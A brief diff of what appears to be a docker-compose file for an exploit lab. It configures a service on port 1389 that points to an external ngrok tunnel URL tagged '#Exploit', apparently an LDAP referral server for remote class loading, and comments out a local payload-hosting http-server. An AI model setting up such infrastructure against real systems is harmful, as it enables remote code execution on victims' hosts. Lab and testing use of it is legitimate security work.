@@ -7,15 +7,15 @@ services:
     command: "http://2.tcp.eu.ngrok.io:19961/#Exploit"
     ports: 
       - 1389:1389
-    depends_on:
-      - http-server
-  http-server:
-    build:
-      context: .
-      dockerfile: Dockerfile.httpserver
-    ports:
-      - "8888:8888"
-    command: "8888"
+    # depends_on:
+      # - http-server
+  # http-server:
+  #   build:
+  #     context: .
+  #     dockerfile: Dockerfile.httpserver
+  #   ports:
+  #     - "8888:8888"
+  #   command: "8888"
   # vuln:
   #   build:
   #     context: .
